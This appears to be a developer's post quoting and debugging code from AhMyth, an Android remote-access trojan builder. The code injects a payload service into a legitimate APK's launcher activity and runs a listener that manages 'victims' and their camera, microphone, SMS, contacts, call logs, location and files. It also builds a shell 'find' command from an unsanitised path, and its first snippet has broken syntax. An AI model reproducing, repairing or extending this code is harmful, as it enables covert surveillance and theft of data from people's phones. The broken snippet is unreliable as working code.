Launcher Extraction for `<application"` attribute | AppCtrl.js = Line 5658 --> 5707 |
```javascript
function GetLauncherPath(manifest, smaliPath) {


    var regex = /<application/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf(
        'android.intent.action.MAIN'
        'android.intent.category.LAUNCHER',
        +
        'android.intent.action.MAIN'
        'android.intent.category.INFO',
        );
    var indexOfApplication = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfApplication = indices[i];
                manifest = manifest.substring(indexOfApplication, manifest.length);
                break;
            }
        }


        if (indexOfApplication != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(1, manifest.indexOf('"'))
                manifest = path.join(smaliPath, manifest) + '.smali';
                var files = fs.walkSync(smaliPath);
                for (var i = 0; i < files.length; i++) {
                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
                        return files[i];
                }

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }
```
  

OrgAppKey2 | Constants.js = Line 32 |
```javascript
exports.orgAppKey2 = ';->onCreate()V';
```


OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
```javascript
var key = CONSTANTS.orgAppKey2;
$appCtrl.Log("Modifiying launcher activity...");
var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
fs.writeFile(launcherPath, output, 'utf8', (error) => {
    if (error) {
        $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
        return;
    }
```
    
Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
```javascript
    // when user clicks Disconnect Button
    $appCtrl.Stop = (port) => {
      if (!port) {
        port = CONSTANTS.defaultPort;
      }
      
      //notify the main process to disconnect the port
      ipcRenderer.send('SocketIO:StopListen', port);
      $appCtrl.Log("Stopped Listening on Port: " + port, CONSTANTS.logStatus.SUCCESS);
    }

    //fired when main process sends any notification about the ServerDisconnect 
    ipcRenderer.on('SocketIO:ServerDisconnect', (event, index) => {
      delete viclist[index];
      $appCtrl.$apply();
    });

    // fired if stopping the listener brings error
    ipcRenderer.on("SocketIO:StopListen", (event, error) => {
      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
      $appCtrl.$apply()
  });

    //notify the main process to close the lab
    $appCtrl.closeLab = (index) => {
      ipcRenderer.send('closeLabWindow', 'lab.html', index)
    }
```
  
Stop function for the AhMyth Listener | Main.js = Line 131 --> 166 + Line 244 --> Line 253 |
```javascript 
// fired when stopped listening for victim
ipcMain.on("SocketIO:StopListen", function (event, port) {

  IO.close();
  IO.sockets.on('connection', function (socket) {
    // decrease socket count on Disconnect
    socket.on('disconnect', function () {
      victimList.rmVictim(index)

      // notify the renderer process about the Server Disconnection
      win.webContents.send('SocketIO:ServerDisconnect', index);

      if (windows[index]) {
        // notify the renderer process about the Disconnected Server
        windows[index].webContents.send('SocketIO:ServerDisconnected', index);
        // delete the windows from the windowList
        delete windows[index];
      }
    });
  });
});


ipcMain.on("closeLabWindow", function (event, index) {
  delete windows[index];
  //on lab window closed remove all socket listners
  if (victimsList.getVictim(index).socket) {
    victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
    victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
    victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
    victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
    victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
    victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
    victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
  }
});

//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {

  if (error.code == "EADDRINUSE" || error.code == "ENOTCONN") {
    win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    win.webContents.send('SocketIO:StopListen', "Server is not Listening");
  } // end of if

});
```

Stop function for the AhMyth Listener | index.html = Line 69 |
```html
<button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
```

code utilising `unix "find"` command to find the launcher activity in the correct path.
For some reason with this, it fails to read the file, but from what I can see it's definitely locating it.
```javascript
                // this returns full path of smali file starting from the users home directory
                $appCtrl.Log("Locating Launcher Activity...")
                exec('find -name "' + launcherPath + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
                  var launcherActivity = path.join(apkFolder, stdout.substring(stdout.indexOf("./") + 2));
                  if (error !== null) {
                      $appCtrl.Log("Locating Launcher Activity Failed!", CONSTANTS.logStatus.FAIL);
                      return;
                    }
                    
                    // but it fails to read the file afterwards
                    $appCtrl.Log("Smali File to hook: " + launcherActivity); // print filepath in the log to confirm the file was found
                    $appCtrl.Log();
                    fs.readFile(launcherActivity, 'utf8', (error, data) => {
                        if (error) {
                            $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
                            $appCtrl.Log();
                            return;
                        }

                    });

                });
``` 
